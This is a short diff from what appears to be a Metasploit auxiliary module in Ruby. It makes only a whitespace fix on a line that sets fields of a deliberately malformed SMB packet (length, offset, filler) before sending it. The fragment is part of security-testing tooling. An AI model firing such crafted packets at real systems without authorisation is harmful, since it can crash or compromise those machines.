@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
     pkt['Payload'].v['DataLenLow'] = dlenlow #<==================
     pkt['Payload'].v['DataOffset'] = doffset #<====
     pkt['Payload'].v['DataOffsetHigh'] = 0xcccccccc #<====
-    pkt['Payload'].v['ByteCount'] = fillersize#<====
+    pkt['Payload'].v['ByteCount'] = fillersize #<====
     pkt['Payload'].v['Payload'] = filler
 
     simple.client.smb_send(pkt.to_s)
